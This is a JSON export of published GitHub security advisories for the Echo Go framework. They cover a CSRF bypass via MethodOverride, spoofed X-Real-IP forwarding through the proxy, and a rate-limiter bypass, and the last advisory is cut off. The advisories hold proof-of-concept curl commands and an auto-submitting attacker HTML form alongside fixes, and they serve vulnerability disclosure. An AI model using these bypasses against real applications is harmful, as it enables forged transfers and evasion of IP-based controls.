+            "repos_url": "https://api.github.com/users/bugbunny-research/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bugbunny-research/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bugbunny-research/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bugbunny-research",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-352"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-352",
+          "name": "Cross-Site Request Forgery (CSRF)"
+        }
+      ],
+      "description": "## Summary\n\nThe `MethodOverride` middleware accepts any non-empty string as the override target method — including safe methods (GET, HEAD, OPTIONS, TRACE) — when rewriting a POST request. When `MethodOverride` is registered before `CSRF` in the post-routing middleware chain (`e.Use()`), it rewrites the request method to a safe method before `CSRF` evaluates it. The CSRF middleware then skips token validation for the now-safe method, allowing state-changing POST handlers to execute without any CSRF check. Both the legacy token path and the modern `Sec-Fetch-Site` protection path are bypassed simultaneously.\n\n## Severity\n\n**Medium** (CVSS 3.1: 5.1)\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N`\n\n- **Attack Vector:** Network — any HTTP client accessible from the internet\n- **Attack Complexity:** Low — no special conditions once the vulnerable configuration is deployed; the exploit requires only a standard form field\n- **Privileges Required:** None — no authentication required on the attacker's side; the victim's session carries credentials\n- **User Interaction:** Required — classic CSRF: victim must be authenticated and visit an attacker-controlled page that submits the form\n- **Scope:** Unchanged — impact stays within the application\n- **Confidentiality Impact:** Low — in account-takeover scenarios, access to victim account data is an indirect consequence; CSRF itself does not directly expose data\n- **Integrity Impact:** High — any state-changing operation protected by CSRF can be executed without a valid token (fund transfer, password change, data deletion, privilege escalation)\n- **Availability Impact:** None\n\n## Affected Component\n\n- `middleware/method_override.go` — `MethodOverrideConfig.ToMiddleware()` (lines 55–71): no whitelist on the override target method\n- `middleware/csrf.go` — `CSRFConfig.ToMiddleware()` (lines 188–189): safe-method bypass branch reads the already-rewritten method\n- `middleware/csrf.go` — `checkSecFetchSiteRequest()` (line 283): `Sec-Fetch-Site` safe check also reads the rewritten method\n\n## CWE\n\n- **CWE-352**: Cross-Site Request Forgery (CSRF) — token validation is bypassed by rewriting the HTTP method to a safe value\n- **CWE-807**: Reliance on Untrusted Inputs in a Security Decision — the CSRF decision is based on `req.Method` which has been rewritten from untrusted input\n\n## Description\n\n### MethodOverride accepts safe methods as override targets\n\n`MethodOverrideConfig.ToMiddleware()` (`method_override.go:55-71`) restricts the **source** method (only POST requests are overrideable) but applies no whitelist to the **target**:\n\n```go\n// method_override.go:61-67\nreq := c.Request()\nif req.Method == http.MethodPost {\n    m := config.Getter(c)\n    if m != \"\" {\n        req.Method = m   // ← any non-empty string accepted, including \"GET\"\n    }\n}\n```\n\nThe docstring's security claim — \"For security reasons, only POST method can be overridden\" — refers only to the source-method restriction. There is no guard preventing POST from being rewritten to `GET`, `HEAD`, `OPTIONS`, or `TRACE`. The test suite (`method_override_test.go`) only tests POST→DELETE and POST→PUT; POST→GET is never tested or blocked.\n\n### CSRF safe-method branch reads the already-rewritten method\n\n`CSRFConfig.ToMiddleware()` (`csrf.go:188-189`) makes its validation decision based on `c.Request().Method` at the time it runs:\n\n```go\n// csrf.go:188-189\nswitch c.Request().Method {\ncase http.MethodGet, http.MethodHead, http.MethodOptions, http.MethodTrace:\n    // skip validation — no token check\ndefault:\n    // validate CSRF token\n```\n\nIf MethodOverride has already run and set `req.Method = \"GET\"`, this `switch` falls into the skip branch regardless of the original HTTP method or what handler was matched.\n\nThe `Sec-Fetch-Site`-based path in `checkSecFetchSiteRequest()` (`csrf.go:283`) is identically vulnerable:\n\n```go\n// csrf.go:283\nisSafe := slices.Contains(safeMethods, c.Request().Method)\n```\n\nWith `req.Method = \"GET\"` (already rewritten), `isSafe = true` and the function returns `true` — the request is allowed even when `Sec-Fetch-Site` is `cross-site`. **Both** CSRF protection paths are bypassed in a single step.\n\n### Execution chain\n\nIn `echo.go:700`, routing and middleware wrapping are performed in one step:\n\n```go\nh = applyMiddleware(e.router.Route(c), e.middleware...)\n```\n\n1. `e.router.Route(c)` evaluates with `req.Method = \"POST\"` → matches and binds the POST `/transfer` handler\n2. `applyMiddleware` wraps it: `MethodOverride → CSRF → postHandler`\n\nAt request execution time:\n3. **MethodOverride** runs: `req.Method == \"POST\"` → reads form field `_method` = `\"GET\"` → `req.Method = \"GET\"` → calls `next`\n4. **CSRF** runs: `c.Request().Method` = `\"GET\"` → `case http.MethodGet` → **skips token validation** → calls `next`\n5. **postHandler** runs (the handler matched in step 1 — the original POST `/transfer` state-change handler)\n\nThe state-changing handler executes with no CSRF token validation and with no `Sec-Fetch-Site` check.\n\n### The missing target-method whitelist is the root cause\n\nThe legitimate use case for MethodOverride is allowing HTML forms (which only support GET/POST) to send PUT, DELETE, or PATCH requests. There is no legitimate scenario in which an HTML form needs to rewrite POST to GET — that can always be expressed as an ordinary GET request. Allowing POST→GET (and HEAD/OPTIONS/TRACE) serves no valid purpose and is inherently dangerous when any safe-method-aware security middleware (CSRF, logging, audit) appears downstream.\n\n## Proof of Concept\n\n```go\npackage main\n\nimport (\n    \"net/http\"\n    echo \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    e := echo.New()\n    // MethodOverride before CSRF — both in e.Use() (post-routing)\n    e.Use(middleware.MethodOverrideWithConfig(middleware.MethodOverrideConfig{\n        Getter: middleware.MethodFromForm(\"_method\"),\n    }))\n    e.Use(middleware.CSRF())\n    e.POST(\"/transfer\", func(c *echo.Context) error {\n        return c.String(http.StatusOK, \"transfer executed\")\n    })\n    e.Logger.Fatal(e.Start(\":18080\"))\n}\n```\n\n```bash\n# Baseline — CSRF correctly blocks a POST without a valid token\ncurl -i -X POST 'http://127.0.0.1:18080/transfer' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'amount=100'\n# HTTP/1.1 400 Bad Request (missing CSRF token)\n\n# Bypass — _method=GET rewrites method before CSRF runs, skipping token validation\ncurl -i -X POST 'http://127.0.0.1:18080/transfer' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data '_method=GET&amount=100'\n# HTTP/1.1 200 OK\n# transfer executed\n\n# Browser-based CSRF PoC (attacker's page, auto-submits on load):\n# <form method=\"POST\" action=\"https://victim.example/transfer\" id=\"f\">\n#   <input name=\"_method\" value=\"GET\">\n#   <input name=\"amount\" value=\"1000\">\n#   <input name=\"to\" value=\"attacker_account\">\n# </form>\n# <script>document.getElementById('f').submit();</script>\n```\n\nThe same bypass works with `MethodFromHeader` (`X-HTTP-Method-Override: GET`) and `MethodFromQuery` (`?_method=GET`).\n\n## Impact\n\n- Any state-changing endpoint protected by `CSRF()` is reachable without a valid CSRF token when the vulnerable middleware ordering is present\n- The `Sec-Fetch-Site` modern-browser CSRF protection is bypassed simultaneously — browsers that support `Sec-Fetch-Site` provide no additional defense\n- Applicable attacks include: fund transfers, password/email changes, account deletion, privilege escalation, data manipulation — any POST-protected operation\n- Audit logs may record `GET` as the HTTP method for what were actually state-changing operations\n\n## Recommended Remediation\n\n### Option 1: Whitelist only unsafe methods as override targets in `MethodOverride` (preferred)\n\nThe root cause is that MethodOverride accepts safe methods as targets. Restricting the override to legitimately overrideable methods (PUT, PATCH, DELETE) closes the bypass regardless of middleware ordering:\n\n```go\n// method_override.go — illustrative fix\nvar allowedOverrideMethods = map[string]bool{\n    http.MethodPut:    true,\n    http.MethodPatch:  true,\n    http.MethodDelete: true,\n}\n\n// in ToMiddleware:\nif req.Method == http.MethodPost {\n    m := config.Getter(c)\n    if m != \"\" && allowedOverrideMethods[m] {\n        req.Method = m\n    }\n}\n```\n\n### Option 2: Use `e.Pre()` for `MethodOverride` and document the ordering requirement\n\nPlacing MethodOverride in `e.Pre()` (pre-routing middleware) causes the router to match the overridden method, not the original POST. If only POST `/transfer` is registered, a POST-to-GET override results in a 405/404 — the handler never executes. Add an explicit documentation warning that MethodOverride must not be placed in `e.Use()` when CSRF middleware is also registered:\n\n```go\n// MethodOverride returns a MethodOverride middleware.\n//\n// IMPORTANT: Register this middleware with e.Pre(), not e.Use().\n// If registered with e.Use() before CSRF middleware, method rewriting\n// occurs after route matching but before CSRF validation, allowing\n// attackers to bypass CSRF token checks by specifying _method=GET.\nfunc MethodOverride() echo.MiddlewareFunc {\n```\n\nOption 1 is strongly preferred as it closes the vulnerability at the source and is safe regardless of middleware placement.\n\n## Credit\n\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0 and `github.com/labstack/echo/v4` v4.16.0. The MethodOverride middleware no longer overrides a POST to `GET`, `HEAD`, `OPTIONS`, `TRACE` or `CONNECT`.\n\n## Workarounds\n\nRegister MethodOverride with `Echo#Pre` (as documented), register CSRF before MethodOverride, or use the default header getter (`X-HTTP-Method-Override`), which a cross-site form cannot set.\n",
+      "ghsa_id": "GHSA-r7w9-592q-9vg4",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-r7w9-592q-9vg4",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-r7w9-592q-9vg4"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:07Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "CSRF Protection Bypass via MethodOverride Rewriting POST to Safe Method",
+      "updated_at": "2026-09-27T23:04:07Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-r7w9-592q-9vg4",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": "4.16.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 4.16.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 3,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "bugbunny-research",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/262839898?v=4",
+            "events_url": "https://api.github.com/users/bugbunny-research/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bugbunny-research/followers",
+            "following_url": "https://api.github.com/users/bugbunny-research/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bugbunny-research/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bugbunny-research",
+            "id": 262839898,
+            "login": "bugbunny-research",
+            "node_id": "U_kgDOD6qeWg",
+            "organizations_url": "https://api.github.com/users/bugbunny-research/orgs",
+            "received_events_url": "https://api.github.com/users/bugbunny-research/received_events",
+            "repos_url": "https://api.github.com/users/bugbunny-research/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bugbunny-research/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bugbunny-research/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bugbunny-research",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-346"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        }
+      ],
+      "description": "## Summary\n\nThe Echo proxy middleware (`middleware/proxy.go`) preserves an incoming `X-Real-IP` header verbatim and forwards it to the upstream service when `Echo#IPExtractor` is not configured — which is the default. Because any HTTP client can supply an arbitrary `X-Real-IP` value, an attacker can cause Echo to relay a spoofed client IP address to every upstream service behind the proxy, undermining upstream IP-based access controls, rate limiting, audit logging, and geo-restriction.\n\n## Severity\n\n**Medium** (CVSS 3.1: 6.7)\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N`\n\n- **Attack Vector:** Network — reachable by any HTTP client\n- **Attack Complexity:** Low — no special conditions; attacker sets a single header\n- **Privileges Required:** None\n- **User Interaction:** None\n- **Scope:** Changed — the vulnerable component is the Echo proxy, but the impact falls on upstream services that have their own security authority and trust Echo's forwarded headers\n- **Confidentiality Impact:** Low — attacker can impersonate a trusted IP to access upstream content; actual confidentiality impact scales with what the upstream protects (could reach High in practice)\n- **Integrity Impact:** Low — attacker can forge audit-log entries and bypass IP-based write controls on upstream; scales with upstream trust model\n- **Availability Impact:** None — no direct denial-of-service from the header passthrough\n\n## Affected Component\n\n- `middleware/proxy.go` — `ProxyConfig.ToMiddleware()`, header-rewriting block (lines 351–355)\n\n## CWE\n\n- **CWE-346**: Origin Validation Error — a forwarded header whose value originates from an untrusted client is passed to a downstream service as if it were authoritative\n- **CWE-441**: Unintended Proxy or Intermediary ('Confused Deputy') — Echo proxies attacker-controlled identity claims to upstream services that trust Echo-forwarded headers\n\n## Description\n\n### The header-preservation condition passes spoofed values to upstream\n\n`ProxyConfig.ToMiddleware()` (`proxy.go:338-405`) prepares forwarding headers before dispatching each request. The `X-Real-IP` rewrite logic at lines 351-355 reads:\n\n```go\n// proxy.go:351-355\n// Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream.\n// However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor.\nif req.Header.Get(echo.HeaderXRealIP) == \"\" || c.Echo().IPExtractor != nil {\n    req.Header.Set(echo.HeaderXRealIP, c.RealIP())\n}\n```\n\nThe condition is `TRUE` (and therefore overwrites the header with a derived value) only when:\n- The header is absent — `req.Header.Get(echo.HeaderXRealIP) == \"\"`; **or**\n- `IPExtractor` is explicitly configured — `c.Echo().IPExtractor != nil`\n\nThe condition is `FALSE` — and the header is left **unchanged** — when the request arrives with an `X-Real-IP` header already set **and** `IPExtractor` is `nil`. Because `Echo.New()` leaves `IPExtractor` as `nil`, this is the out-of-the-box behaviour for every application that uses `Proxy()` or `ProxyWithConfig()` without extra configuration.\n\nAn attacker who sets `X-Real-IP` to any value causes Echo to forward exactly that value to the upstream, with no modification or validation.\n\n### The comment in the source code confirms intent and the security gap\n\nThe inline comment at line 351-352 explicitly states:\n\n> \"Basically it's not good practice to unconditionally pass incoming x-real-ip header to upstream. However, for backward compatibility, legacy behavior is preserved unless you configure Echo#IPExtractor.\"\n\nThe framework is aware that the default is insecure and retains it for backward compatibility. No warning appears in the `Proxy()` or `ProxyWithConfig()` documentation, so operators who follow the standard setup example receive a silently insecure proxy configuration.\n\nThis is structurally identical to the documented insecurity in `ip.go:27`:\n\n> \"Note: if you don't set `Echo#IPExtractor` explicitly, Echo fallback to legacy behavior, which is not a good choice.\"\n\n### Full execution chain\n\n1. Attacker sends `GET /api/admin` to the Echo proxy with header `X-Real-IP: 203.0.113.1` (a trusted corporate IP)\n2. `ToMiddleware()` evaluates the guard at line 353: header is present (`!= \"\"`), `IPExtractor` is `nil` → condition is `FALSE`\n3. `req.Header.Set` is **not** called; the upstream request carries the original, attacker-supplied `X-Real-IP: 203.0.113.1`\n4. Upstream service checks `X-Real-IP` against its IP allowlist → finds `203.0.113.1` → grants access\n5. Attacker reaches an endpoint that should be restricted to the corporate IP range\n\nSecondary impact path (audit poisoning):\n- All upstream log entries, rate-limit counters, and geo-restriction checks are evaluated against `203.0.113.1` rather than the real client IP, rendering audit trails and security analytics unreliable.\n\n## Proof of Concept\n\n```go\npackage main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n    echo \"github.com/labstack/echo/v5\"\n    \"github.com/labstack/echo/v5/middleware\"\n)\n\nfunc main() {\n    // Upstream server: echoes back the X-Real-IP it received\n    upstream := http.NewServeMux()\n    upstream.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n        fmt.Fprintf(w, \"upstream sees X-Real-IP: %s\\n\", r.Header.Get(\"X-Real-IP\"))\n    })\n    go http.ListenAndServe(\":9000\", upstream)\n\n    // Echo proxy — IPExtractor deliberately NOT set (the default)\n    e := echo.New()\n    targets := []*middleware.ProxyTarget{{URL: mustParse(\"http://127.0.0.1:9000\")}}\n    e.Use(middleware.Proxy(middleware.NewRoundRobinBalancer(targets)))\n    log.Fatal(e.Start(\":1323\"))\n}\n```\n\n```bash\n# Without spoofed header — upstream sees actual peer address\ncurl http://127.0.0.1:1323/\n# upstream sees X-Real-IP: 127.0.0.1\n\n# With spoofed header — upstream sees attacker-supplied value\ncurl -H 'X-Real-IP: 198.51.100.77' http://127.0.0.1:1323/\n# upstream sees X-Real-IP: 198.51.100.77\n```\n\nThe attacker-supplied IP `198.51.100.77` arrives at the upstream unchanged.\n\n## Impact\n\n- Upstream IP-based access controls (allowlists, blocklists, geo-restrictions) can be bypassed by supplying the expected IP in `X-Real-IP`\n- Upstream rate limiters that key on `X-Real-IP` are bypassable (same class as the Echo rate-limiter finding, now on every upstream service)\n- Audit logs, intrusion detection systems, and SIEM tools that rely on `X-Real-IP` record the attacker-chosen IP, not the real source — forensic trails are poisoned\n- Any upstream admin endpoint restricted by IP allowlist is reachable by any attacker who knows or guesses a trusted IP address\n\n## Recommended Remediation\n\n### Option 1: Always overwrite `X-Real-IP` from an authoritative source (preferred)\n\nRemove the conditional that preserves the incoming header. Echo, as the edge proxy, is the only authoritative source for the real client IP:\n\n```go\n// proxy.go — always set X-Real-IP from an authoritative source\nreq.Header.Set(echo.HeaderXRealIP, c.RealIP())\n```\n\nFor this to be safe, operators using `Proxy()` should also configure `IPExtractor`:\n\n```go\ne.IPExtractor = echo.ExtractIPDirect() // no upstream proxy\n// or\ne.IPExtractor = echo.ExtractIPFromXFFHeader() // behind a trusted upstream LB\n```\n\n### Option 2: Document and warn in `Proxy()` godoc\n\nIf backward compatibility must be preserved, add a prominent security warning to `Proxy()` and `ProxyWithConfig()`:\n\n```go\n// Proxy returns a Proxy middleware.\n//\n// SECURITY: By default, an incoming X-Real-IP header supplied by the client\n// is forwarded to the upstream unchanged. This allows any client to spoof its\n// IP identity to upstream services. Configure Echo#IPExtractor before using\n// this middleware to ensure X-Real-IP is derived from a trusted source:\n//\n//   e.IPExtractor = echo.ExtractIPDirect()\n//\n// See https://echo.labstack.com/guide/ip-address for details.\nfunc Proxy(balancer ProxyBalancer) echo.MiddlewareFunc {\n```\n\n## Credit\n\nThis vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).\n\n## Patches\n\nFixed in `github.com/labstack/echo/v5` v5.4.0: the Proxy middleware always sets `X-Real-IP` from `Context.RealIP()`, which is the address of the direct peer unless `Echo#IPExtractor` is configured.\n\n`github.com/labstack/echo/v4` is not changed, because v4's `Context.RealIP()` without `Echo#IPExtractor` trusts `X-Forwarded-For` and `X-Real-IP` by design, and changing that default would merge all clients behind a proxy into one rate-limit bucket.\n\n## Workarounds\n\nConfigure `Echo#IPExtractor` for your deployment, for example `e.IPExtractor = echo.ExtractIPDirect()` when there is no proxy in front of the application, or `echo.ExtractIPFromXFFHeader()` / `echo.ExtractIPFromRealIPHeader()` (with `TrustIPRange` for proxies on public addresses). With an extractor set, the Proxy middleware overwrites `X-Real-IP` in v4 too.\n",
+      "ghsa_id": "GHSA-99jh-6h7p-pp36",
+      "html_url": "https://github.com/labstack/echo/security/advisories/GHSA-99jh-6h7p-pp36",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-99jh-6h7p-pp36"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-27T23:04:02Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/314036?v=4",
+        "events_url": "https://api.github.com/users/vishr/events{/privacy}",
+        "followers_url": "https://api.github.com/users/vishr/followers",
+        "following_url": "https://api.github.com/users/vishr/following{/other_user}",
+        "gists_url": "https://api.github.com/users/vishr/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/vishr",
+        "id": 314036,
+        "login": "vishr",
+        "node_id": "MDQ6VXNlcjMxNDAzNg==",
+        "organizations_url": "https://api.github.com/users/vishr/orgs",
+        "received_events_url": "https://api.github.com/users/vishr/received_events",
+        "repos_url": "https://api.github.com/users/vishr/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/vishr/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/vishr/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/vishr",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "Reverse Proxy Forwards Attacker-Supplied X-Real-IP to Upstream by Default",
+      "updated_at": "2026-09-27T23:04:02Z",
+      "url": "https://api.github.com/repos/labstack/echo/security-advisories/GHSA-99jh-6h7p-pp36",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v5"
+          },
+          "patched_versions": "5.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "< 5.4.0"
+        },
+        {
+          "package": {
+            "ecosystem": "go",
+            "name": "github.com/labstack/echo/v4"
+          },
+          "patched_versions": null,
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 3,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "bugbunny-research",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/262839898?v=4",
+            "events_url": "https://api.github.com/users/bugbunny-research/events{/privacy}",
+            "followers_url": "https://api.github.com/users/bugbunny-research/followers",
+            "following_url": "https://api.github.com/users/bugbunny-research/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bugbunny-research/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/bugbunny-research",
+            "id": 262839898,
+            "login": "bugbunny-research",
+            "node_id": "U_kgDOD6qeWg",
+            "organizations_url": "https://api.github.com/users/bugbunny-research/orgs",
+            "received_events_url": "https://api.github.com/users/bugbunny-research/received_events",
+            "repos_url": "https://api.github.com/users/bugbunny-research/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/bugbunny-research/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bugbunny-research/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/bugbunny-research",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": null,
+      "cvss": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.3,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-290"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-290",
+          "name": "Authentication Bypass by Spoofing"
+        }
+      ],
+      "description": "## Summary\n\nWhen `echo.New()` is used without explicitly setting `Echo#IPExtractor`, the `RealIP()` method falls back to reading the client-supplied `X-Forwarded-For` (or `X-Real-IP`) header without any proxy-origin validation. The default `RateLimiter()` middleware derives its per-client identifier from `ctx.RealIP()`, so an attacker can rotate arbitrary values in the `X-Forwarded-For` header on each request to obtain a fresh rate-limit bucket and bypass IP-based throttling entirely.\n\n## Severity\n\n**Medium** (CVSS 3.1: 5.3)\n\n`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`\n\n- **Attack Vector:** Network — any HTTP client can set arbitrary request headers\n- **Attack Complexity:** Low — no special conditions, chaining, or network position required; attacker simply rotates a header value\n- **Privileges Required:** None — no authentication required\n- **User Interaction:** None\n- **Scope:** Unchanged — impact is contained to the rate-limited service\n- **Confidentiality Impact:** None — the bypass itself does not expose data\n- **Integrity Impact:** Low — allows unlimited requests to endpoints protected by IP-based throttling, enabling brute-force, credential stuffing, or enumeration against controls that depend on rate limiting\n- **Availability Impact:** Low — can facilitate high-volume request floods against rate-limited endpoints; does not cause direct DoS but removes the throttle intended to prevent it\n\n## Affected Component\n\n- `context.go` — `(*Context).RealIP()` (lines 186–208), legacy fallback branch (lines 190–200)\n- `middleware/rate_limiter.go` — `DefaultRateLimiterConfig.IdentifierExtractor` (lines 46–58); `RateLimiter()` (lines 71–76)\n- `echo.go` — `New()` (lines 326–343), `IPExtractor` left `nil` by default\n\n## CWE\n\n- **CWE-284**: Improper Access Control — rate limiting can be bypassed via client-controlled input\n- **CWE-346**: Origin Validation Error — forwarded IP headers accepted from untrusted sources without proxy-origin validation\n\n## Description\n\n### `RealIP()` unconditionally trusts `X-Forwarded-For` when `IPExtractor` is unset\n\n`Context.RealIP()` (`context.go:186-208`) first checks `c.echo.IPExtractor`. When this field is `nil` (the default for `echo.New()`), it falls through to legacy behavior and returns the **first IP** from the `X-Forwarded-For` header — the position an attacker has full control over:\n\n```go\n// context.go:186-200\nfunc (c *Context) RealIP() string {\n    if c.echo != nil && c.echo.IPExtractor != nil {\n        return c.echo.IPExtractor(c.request)\n    }\n    // Fall back to legacy behavior\n    if ip := c.request.Header.Get(HeaderXForwardedFor); ip != \"\" {\n        i := strings.IndexAny(ip, \",\")\n        if i > 0 {\n            xffip := strings.TrimSpace(ip[:i])\n            xffip = strings.TrimPrefix(xffip, \"[\")\n            xffip = strings.TrimSuffix(xffip, \"]\")\n            return xffip   // ← attacker-controlled first IP\n        }\n        return ip\n    }\n    if ip := c.request.Header.Get(HeaderXRealIP); ip != \"\" {\n        ...\n        return ip          // ← also attacker-controlled\n    }\n    ra, _, _ := net.SplitHostPort(c.request.RemoteAddr)\n    return ra\n}\n```\n\n### Rate limiter default identifier extractor calls `RealIP()` unconditionally\n\n`DefaultRateLimiterConfig` (`rate_limiter.go:46-58`) sets the identifier extractor to `ctx.RealIP()` with no guard for whether a safe `IPExtractor` is configured:\n\n```go\n// rate_limiter.go:46-58\nvar DefaultRateLimiterConfig = RateLimiterConfig{\n    Skipper: DefaultSkipper,\n    IdentifierExtractor: func(ctx *echo.Context) (string, error) {\n        id := ctx.RealIP()   // ← reads attacker-controlled header\n        return id, nil\n    },\n    ...\n}\n```\n\n`RateLimiter(store)` (`rate_limiter.go:71-76`) copies `DefaultRateLimiterConfig` directly:\n\n```go\n// rate_limiter.go:71-76\nfunc RateLimiter(store RateLimiterStore) echo.MiddlewareFunc {\n    config := DefaultRateLimiterConfig\n    config.Store = store\n    return RateLimiterWithConfig(config)\n}\n```\n\nThe result is that the most common usage pattern — `e.GET(\"/path\", h, middleware.RateLimiter(store))` — produces a rate limiter whose per-client identifier is fully controlled by the requester.\n\n### Framework acknowledges the issue for IP extraction but the rate limiter carries no warning\n\n`ip.go:27` explicitly states the default is insecure:\n\n> \"Note: if you don't set `Echo#IPExtractor` explicitly, Echo fallback to legacy behavior, which is not a good choice.\"\n\nAnd `ip.go:117-119`:\n\n> \"In default behavior, Echo sees all of first XFF header, X-Real-IP header and IP from network layer. As you might already notice, after reading this article, this is not good. Sole reason this is default is just backward compatibility.\"\n\nThe `IPExtractor` mechanism (`ExtractIPDirect()`, `ExtractIPFromXFFHeader()`, `ExtractIPFromRealIPHeader()`) in `ip.go` exists precisely to close this gap. However, the `RateLimiter()` function and `DefaultRateLimiterConfig` have **no corresponding warning** and make no attempt to detect or flag that `IPExtractor` is unset, leaving operators who follow the standard rate limiter example silently exposed.\n\nThe test `TestRateLimiterWithConfig_defaultConfig` (`rate_limiter_test.go:181-226`) itself drives the rate limiter by setting `X-Real-IP` directly on the test request — demonstrating that the identifier is 